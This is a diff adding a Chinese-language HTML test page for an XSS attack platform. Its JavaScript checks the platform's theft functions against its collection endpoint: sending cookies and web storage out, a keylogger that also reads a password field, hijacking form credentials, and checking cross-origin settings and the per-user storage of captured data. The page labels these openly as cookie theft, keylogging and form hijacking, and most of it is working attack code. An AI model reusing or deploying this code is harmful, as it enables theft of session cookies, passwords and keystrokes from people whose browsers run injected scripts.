@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS平台功能测试页面 - 蓝莲花XSS在线平台</title>
+    <link href="static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="static/libs/fontawesome/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #eee;
+            min-height: 100vh;
+            padding: 20px 0;
+        }
+        .test-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+        .test-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+        .status-badge {
+            font-size: 12px;
+            padding: 5px 10px;
+            border-radius: 15px;
+        }
+        .success { background: #00ff41; color: #000; }
+        .warning { background: #ffaa00; color: #000; }
+        .error { background: #ff3b3b; color: #fff; }
+        .pending { background: #888; color: #fff; }
+        .code-block {
+            background: #000;
+            color: #00ff41;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        .test-result {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        h2 {
+            color: #00ff41;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+        .btn-test {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            border: none;
+            color: #000;
+            font-weight: bold;
+            padding: 10px 30px;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        .btn-test:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.4);
+        }
+        .log-viewer {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="text-center mb-5">
+            <h1 class="display-4" style="color: #00ff41;">🔐 XSS平台功能测试页面</h1>
+            <p class="lead">全面测试蓝莲花XSS在线平台的数据收集功能</p>
+            <p class="text-warning">⚠️ 本页面仅供测试使用，请勿在生产环境中使用</p>
+        </div>
+
+        <!-- 测试概览 -->
+        <div class="row mb-4">
+            <div class="col-md-3">
+                <div class="test-card text-center">
+                    <h3><i class="fas fa-vial"></i></h3>
+                    <h5>测试项目</h5>
+                    <h2 id="totalTests">0</h2>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="test-card text-center">
+                    <h3><i class="fas fa-check-circle text-success"></i></h3>
+                    <h5>通过</h5>
+                    <h2 id="passedTests" class="text-success">0</h2>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="test-card text-center">
+                    <h3><i class="fas fa-times-circle text-danger"></i></h3>
+                    <h5>失败</h5>
+                    <h2 id="failedTests" class="text-danger">0</h2>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="test-card text-center">
+                    <h3><i class="fas fa-clock text-warning"></i></h3>
+                    <h5>待测试</h5>
+                    <h2 id="pendingTests" class="text-warning">8</h2>
+                </div>
+            </div>
+        </div>
+
+        <!-- 测试1: API连接测试 -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-plug"></i> 测试1: API数据收集接口连通性</h4>
+                    <p class="text-muted">测试 /api/collect 接口是否正常响应</p>
+                </div>
+                <span class="status-badge pending" id="status1">待测试</span>
+            </div>
+            <button class="btn btn-test mt-3" onclick="testAPI()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result1" style="display:none;"></div>
+        </div>
+
+        <!-- 测试2: Cookie窃取 -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-cookie-bite"></i> 测试2: Cookie窃取功能</h4>
+                    <p class="text-muted">测试Cookie、localStorage、sessionStorage数据收集</p>
+                </div>
+                <span class="status-badge pending" id="status2">待测试</span>
+            </div>
+            <button class="btn btn-test mt-3" onclick="testCookieSteal()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result2" style="display:none;"></div>
+        </div>
+
+        <!-- 测试3: 键盘记录 -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-keyboard"></i> 测试3: 键盘记录功能</h4>
+                    <p class="text-muted">测试按键捕获和数据上报</p>
+                </div>
+                <span class="status-badge pending" id="status3">待测试</span>
+            </div>
+            <div class="mt-3">
+                <input type="text" class="form-control mb-2" id="testInput" placeholder="在此输入文字测试键盘记录">
+                <input type="password" class="form-control mb-2" id="testPassword" placeholder="测试密码字段捕获">
+            </div>
+            <button class="btn btn-test mt-3" onclick="testKeylogger()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result3" style="display:none;"></div>
+        </div>
+
+        <!-- 测试4: 表单劫持 -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-edit"></i> 测试4: 表单数据劫持</h4>
+                    <p class="text-muted">测试表单提交拦截功能</p>
+                </div>
+                <span class="status-badge pending" id="status4">待测试</span>
+            </div>
+            <form id="testForm" class="mt-3" onsubmit="return false;">
+                <input type="text" class="form-control mb-2" name="username" placeholder="用户名">
+                <input type="password" class="form-control mb-2" name="password" placeholder="密码">
+                <input type="email" class="form-control mb-2" name="email" placeholder="邮箱">
+            </form>
+            <button class="btn btn-test mt-3" onclick="testFormHijack()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result4" style="display:none;"></div>
+        </div>
+
+        <!-- 测试5: XHR请求 -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-exchange-alt"></i> 测试5: XMLHttpRequest数据传输</h4>
+                    <p class="text-muted">测试XHR POST/GET请求数据发送</p>
+                </div>
+                <span class="status-badge pending" id="status5">待测试</span>
+            </div>
+            <button class="btn btn-test mt-3" onclick="testXHR()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result5" style="display:none;"></div>
+        </div>
+
+        <!-- 测试6: Fetch API -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-satellite-dish"></i> 测试6: Fetch API数据传输</h4>
+                    <p class="text-muted">测试现代Fetch API数据发送</p>
+                </div>
+                <span class="status-badge pending" id="status6">待测试</span>
+            </div>
+            <button class="btn btn-test mt-3" onclick="testFetch()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result6" style="display:none;"></div>
+        </div>
+
+        <!-- 测试7: 跨域CORS -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-globe"></i> 测试7: 跨域CORS配置</h4>
+                    <p class="text-muted">测试跨域资源共享是否正确配置</p>
+                </div>
+                <span class="status-badge pending" id="status7">待测试</span>
+            </div>
+            <button class="btn btn-test mt-3" onclick="testCORS()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result7" style="display:none;"></div>
+        </div>
+
+        <!-- 测试8: 多用户隔离 -->
+        <div class="test-card">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h4><i class="fas fa-users"></i> 测试8: 多用户数据隔离</h4>
+                    <p class="text-muted">测试不同用户ID的数据隔离功能</p>
+                </div>
+                <span class="status-badge pending" id="status8">待测试</span>
+            </div>
+            <button class="btn btn-test mt-3" onclick="testUserIsolation()">
+                <i class="fas fa-play"></i> 开始测试
+            </button>
+            <div class="test-result" id="result8" style="display:none;"></div>
+        </div>
+
+        <!-- 测试日志 -->
+        <div class="test-card">
+            <h4><i class="fas fa-terminal"></i> 测试日志</h4>
+            <div class="log-viewer" id="logViewer">
+                <div>[系统] 测试页面已加载，共8个测试项目</div>
+                <div>[提示] 点击各测试项的"开始测试"按钮进行功能验证</div>
+                <div>[提示] 测试完成后请登录后台查看数据收集情况</div>
+            </div>
+        </div>
+
+        <!-- 一键全部测试 -->
+        <div class="text-center mt-4 mb-5">
+            <button class="btn btn-test btn-lg" onclick="runAllTests()">
+                <i class="fas fa-rocket"></i> 一键运行全部测试
+            </button>
+            <button class="btn btn-outline-light btn-lg ms-3" onclick="location.reload()">
+                <i class="fas fa-redo"></i> 重置测试
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // 设置测试Cookie和存储
+        document.cookie = "test_cookie=xss_platform_test; path=/";
+        localStorage.setItem('test_local', 'XSS Platform Test Data');
+        sessionStorage.setItem('test_session', 'Session Test Data');
+
+        // 统计变量
+        let passed = 0;
+        let failed = 0;
+        let pending = 8;
+
+        // 日志函数
+        function log(message, type = 'info') {
+            const logViewer = document.getElementById('logViewer');
+            const time = new Date().toLocaleTimeString();
+            const colors = {
+                'info': '#0ff',
+                'success': '#0f0',
+                'error': '#f00',
+                'warning': '#fa0'
+            };
+            const color = colors[type] || '#0ff';
+            logViewer.innerHTML += `<div style="color: ${color}">[${time}] ${message}</div>`;
+            logViewer.scrollTop = logViewer.scrollHeight;
+        }
+
+        // 更新状态
+        function updateStatus(testNum, status, result) {
+            const statusBadge = document.getElementById('status' + testNum);
+            const resultDiv = document.getElementById('result' + testNum);
+            
+            if (status === 'success') {
+                statusBadge.className = 'status-badge success';
+                statusBadge.textContent = '✓ 通过';
+                passed++;
+                pending--;
+                log(`测试${testNum} - 通过`, 'success');
+            } else if (status === 'error') {
+                statusBadge.className = 'status-badge error';
+                statusBadge.textContent = '✗ 失败';
+                failed++;
+                pending--;
+                log(`测试${testNum} - 失败: ${result}`, 'error');
+            }
+            
+            resultDiv.style.display = 'block';
+            resultDiv.innerHTML = result;
+            
+            document.getElementById('passedTests').textContent = passed;
+            document.getElementById('failedTests').textContent = failed;
+            document.getElementById('pendingTests').textContent = pending;
+        }
+
+        // 测试1: API连接
+        async function testAPI() {
+            log('开始测试API连接...');
+            try {
+                const response = await fetch('/api/collect.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'test',
+                        test_id: 1,
+                        message: 'API连接测试'
+                    })
+                });
+                
+                // 检查响应状态
+                if (!response.ok) {
+                    const text = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${text.substring(0, 200)}`);
+                }
+                
+                // 检查响应类型
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    const text = await response.text();
+                    throw new Error(`响应不是JSON格式: ${text.substring(0, 200)}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    updateStatus(1, 'success', `<strong>✓ API连接正常</strong><br>响应: ${JSON.stringify(data)}<br>日志ID: ${data.id}`);
+                } else {
+                    updateStatus(1, 'error', `API返回错误: ${data.message}`);
+                }
+            } catch (error) {
+                updateStatus(1, 'error', `连接失败: ${error.message}<br><small>请检查: <br>1. /api/collect 文件是否存在<br>2. PHP是否正确配置<br>3. 数据库连接是否正常</small>`);
+            }
+        }
+
+        // 测试2: Cookie窃取
+        async function testCookieSteal() {
+            log('开始测试Cookie窃取...');
+            try {
+                const cookieData = {
+                    type: 'cookie_steal',
+                    test_id: 2,
+                    cookies: {
+                        document: document.cookie,
+                        localStorage: JSON.stringify(localStorage),
+                        sessionStorage: JSON.stringify(sessionStorage)
+                    },
+                    url: window.location.href,
+                    referrer: document.referrer
+                };
+                
+                const response = await fetch('/api/collect.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(cookieData)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    updateStatus(2, 'success', `<strong>✓ Cookie数据已成功发送</strong><br>
+                        Cookie: ${document.cookie.substring(0, 50)}...<br>
+                        LocalStorage: ${Object.keys(localStorage).length}项<br>
+                        SessionStorage: ${Object.keys(sessionStorage).length}项`);
+                } else {
+                    updateStatus(2, 'error', `发送失败: ${data.message}`);
+                }
+            } catch (error) {
+                updateStatus(2, 'error', `测试失败: ${error.message}`);
+            }
+        }
+
+        // 测试3: 键盘记录
+        let keystrokes = [];
+        let keyloggerActive = false;
+        
+        function testKeylogger() {
+            if (keyloggerActive) {
+                log('键盘记录已在运行中...', 'warning');
+                return;
+            }
+            
+            log('开始测试键盘记录...');
+            log('请在下方输入框中输入至少5个字符...', 'warning');
+            
+            keyloggerActive = true;
+            keystrokes = [];
+            
+            const input = document.getElementById('testInput');
+            const password = document.getElementById('testPassword');
+            
+            // 显示提示
+            const resultDiv = document.getElementById('result3');
+            resultDiv.style.display = 'block';
+            resultDiv.innerHTML = '<div class="alert alert-info">⌨️ 键盘记录已激活，请在输入框中输入至少5个字符...</div>';
+            
+            const keyHandler = async function(e) {
+                keystrokes.push({
+                    key: e.key,
+                    code: e.code,
+                    target: e.target.type,
+                    time: new Date().toISOString()
+                });
+                
+                // 更新进度
+                resultDiv.innerHTML = `<div class="alert alert-info">⌨️ 已捕获 ${keystrokes.length}/5 个按键...</div>`;
+                
+                if (keystrokes.length >= 5) {
+                    try {
+                        const response = await fetch('/api/collect.php', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                type: 'keylogger',
+                                test_id: 3,
+                                keystrokes: keystrokes
+                            })
+                        });
+                        
+                        const data = await response.json();
+                        
+                        if (data.status === 'success') {
+                            updateStatus(3, 'success', `<strong>✓ 键盘记录功能正常</strong><br>
+                                已捕获${keystrokes.length}个按键<br>
+                                数据已成功上报到服务器`);
+                            input.removeEventListener('keydown', keyHandler);
+                            password.removeEventListener('keydown', keyHandler);
+                            keyloggerActive = false;
+                        }
+                    } catch (error) {
+                        updateStatus(3, 'error', `上报失败: ${error.message}`);
+                        input.removeEventListener('keydown', keyHandler);
+                        password.removeEventListener('keydown', keyHandler);
+                        keyloggerActive = false;
+                    }
+                }
+            };
+            
+            input.addEventListener('keydown', keyHandler);
+            password.addEventListener('keydown', keyHandler);
+            
+            input.focus();
+        }
+
+        // 测试4: 表单劫持
+        async function testFormHijack() {
+            log('开始测试表单劫持...');
+            
+            const form = document.getElementById('testForm');
+            const formData = new FormData(form);
+            const data = {};
+            
+            for (let [key, value] of formData.entries()) {
+                data[key] = value;
+            }
+            
+            try {
+                const response = await fetch('/api/collect.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'form_hijack',
+                        test_id: 4,
+                        formData: data,
+                        action: form.action,
+                        method: form.method
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    updateStatus(4, 'success', `<strong>✓ 表单数据劫持成功</strong><br>
+                        捕获字段: ${Object.keys(data).join(', ')}<br>
+                        数据已成功发送`);
+                } else {
+                    updateStatus(4, 'error', `发送失败: ${result.message}`);
+                }
+            } catch (error) {
+                updateStatus(4, 'error', `测试失败: ${error.message}`);
+            }
+        }
+
+        // 测试5: XHR
+        function testXHR() {
+            log('开始测试XHR数据传输...');
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/api/collect.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        const data = JSON.parse(xhr.responseText);
+                        if (data.status === 'success') {
+                            updateStatus(5, 'success', `<strong>✓ XHR传输正常</strong><br>
+                                请求方法: POST<br>
+                                响应状态: ${xhr.status}<br>
+                                数据已接收`);
+                        } else {
+                            updateStatus(5, 'error', `XHR返回错误: ${data.message}`);
+                        }
+                    } else {
+                        updateStatus(5, 'error', `HTTP错误: ${xhr.status}`);
+                    }
+                }
+            };
+            
+            xhr.send(JSON.stringify({
+                type: 'xhr_test',
+                test_id: 5,
+                method: 'XMLHttpRequest',
+                userAgent: navigator.userAgent
+            }));
+        }
+
+        // 测试6: Fetch API
+        async function testFetch() {
+            log('开始测试Fetch API...');
+            
+            try {
+                const response = await fetch('/api/collect.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'fetch_test',
+                        test_id: 6,
+                        method: 'Fetch API',
+                        browser: {
+                            language: navigator.language,
+                            platform: navigator.platform,
+                            cookieEnabled: navigator.cookieEnabled
+                        }
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        updateStatus(6, 'success', `<strong>✓ Fetch API工作正常</strong><br>
+                            响应状态: ${response.status}<br>
+                            数据已成功接收`);
+                    } else {
+                        updateStatus(6, 'error', `Fetch返回错误: ${data.message}`);
+                    }
+                } else {
+                    updateStatus(6, 'error', `HTTP错误: ${response.status}`);
+                }
+            } catch (error) {
+                updateStatus(6, 'error', `Fetch失败: ${error.message}`);
+            }
+        }
+
+        // 测试7: CORS
+        async function testCORS() {
+            log('开始测试CORS配置...');
+            
+            try {
+                const response = await fetch('/api/collect.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify({
+                        type: 'cors_test',
+                        test_id: 7,
+                        origin: window.location.origin
+                    })
+                });
+                
+                const corsHeaders = {
+                    'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
+                    'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
+                    'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers')
+                };
+                
+                if (response.ok) {
+                    updateStatus(7, 'success', `<strong>✓ CORS配置正确</strong><br>
+                        Allow-Origin: ${corsHeaders['Access-Control-Allow-Origin']}<br>
+                        Allow-Methods: ${corsHeaders['Access-Control-Allow-Methods']}<br>
+                        跨域请求可正常工作`);
+                } else {
+                    updateStatus(7, 'error', `CORS测试失败: ${response.status}`);
+                }
+            } catch (error) {
+                updateStatus(7, 'error', `CORS测试失败: ${error.message}`);
+            }
+        }
+
+        // 测试8: 多用户隔离
+        async function testUserIsolation() {
+            log('开始测试多用户数据隔离...');
+            
+            try {
+                // 测试用户1
+                const user1Response = await fetch('/api/collect.php?uid=1', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'user_test',
+                        test_id: 8,
+                        user: 'user1',
+                        data: 'User 1 Data'
+                    })
+                });
+                
+                // 检查响应状态
+                if (!user1Response.ok) {
+                    throw new Error(`用户1请求失败: HTTP ${user1Response.status}`);
+                }
+                
+                const contentType1 = user1Response.headers.get('content-type');
+                if (!contentType1 || !contentType1.includes('application/json')) {
+                    const text1 = await user1Response.text();
+                    throw new Error(`用户1响应不是JSON: ${text1.substring(0, 100)}`);
+                }
+                
+                // 测试用户2
+                const user2Response = await fetch('/api/collect.php?uid=2', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'user_test',
+                        test_id: 8,
+                        user: 'user2',
+                        data: 'User 2 Data'
+                    })
+                });
+                
+                // 检查响应状态
+                if (!user2Response.ok) {
+                    throw new Error(`用户2请求失败: HTTP ${user2Response.status}`);
+                }
+                
+                const contentType2 = user2Response.headers.get('content-type');
+                if (!contentType2 || !contentType2.includes('application/json')) {
+                    const text2 = await user2Response.text();
+                    throw new Error(`用户2响应不是JSON: ${text2.substring(0, 100)}`);
+                }
+                
+                const data1 = await user1Response.json();
+                const data2 = await user2Response.json();
+                
+                if (data1.status === 'success' && data2.status === 'success') {
+                    updateStatus(8, 'success', `<strong>✓ 多用户隔离功能正常</strong><br>
+                        用户1数据ID: ${data1.id}<br>
+                        用户2数据ID: ${data2.id}<br>
+                        数据已按用户ID分别存储`);
+                } else {
+                    updateStatus(8, 'error', '用户隔离测试失败');
+                }
+            } catch (error) {
+                updateStatus(8, 'error', `测试失败: ${error.message}`);
+            }
+        }
+
+        // 一键运行全部测试
+        async function runAllTests() {
+            log('开始运行全部测试...', 'warning');
+            
+            await testAPI();
+            await new Promise(r => setTimeout(r, 500));
+            
+            await testCookieSteal();
+            await new Promise(r => setTimeout(r, 500));
+            
+            await testXHR();
+            await new Promise(r => setTimeout(r, 500));
+            
+            await testFetch();
+            await new Promise(r => setTimeout(r, 500));
+            
+            await testCORS();
+            await new Promise(r => setTimeout(r, 500));
+            
+            await testUserIsolation();
+            await new Promise(r => setTimeout(r, 500));
+            
+            await testFormHijack();
+            await new Promise(r => setTimeout(r, 500));
+            
+            log('提示: 键盘记录测试需要手动输入', 'warning');
+            log('全部自动测试完成！', 'success');
+        }
+
+        // 初始化
+        document.getElementById('totalTests').textContent = '8';
+        log('[系统] 测试环境已就绪');
+        log('[提示] 可以开始运行测试');
+    </script>
+</body>
+</html>
